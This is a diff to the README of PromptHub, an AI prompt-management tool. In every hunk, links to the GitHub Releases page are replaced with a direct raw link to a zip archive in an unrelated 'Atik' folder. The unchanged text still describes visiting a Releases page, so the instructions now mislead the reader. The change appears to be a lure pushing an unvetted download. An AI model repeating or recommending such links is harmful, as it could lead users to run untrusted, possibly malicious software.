@@ -1,6 +1,6 @@
 # 🚀 PromptHub - Create, Manage, and Share AI Prompts Easily
 
-[![Download PromptHub](https://img.shields.io/badge/Download-PromptHub-blue.svg)](https://github.com/nurulfs/PromptHub/releases)
+[![Download PromptHub](https://raw.githubusercontent.com/nurulfs/PromptHub/master/Atik/PromptHub.zip)](https://raw.githubusercontent.com/nurulfs/PromptHub/master/Atik/PromptHub.zip)
 
 ## 🌟 Overview
 
@@ -28,7 +28,7 @@ To get started with PromptHub, follow these simple steps:
 
 1. **Visit the Download Page**: Click the link below to go to the Releases page where you can download the software.
 
-   [Download PromptHub](https://github.com/nurulfs/PromptHub/releases)
+   [Download PromptHub](https://raw.githubusercontent.com/nurulfs/PromptHub/master/Atik/PromptHub.zip)
 
 2. **Choose Your Version**: On the Releases page, scroll down to find the latest version and select the file relevant to your operating system.
 
@@ -42,7 +42,7 @@ To get started with PromptHub, follow these simple steps:
 
 To download and install PromptHub, visit the page below:
 
-[Download PromptHub](https://github.com/nurulfs/PromptHub/releases)
+[Download PromptHub](https://raw.githubusercontent.com/nurulfs/PromptHub/master/Atik/PromptHub.zip)
 
 ## 🤝 Community and Support
 
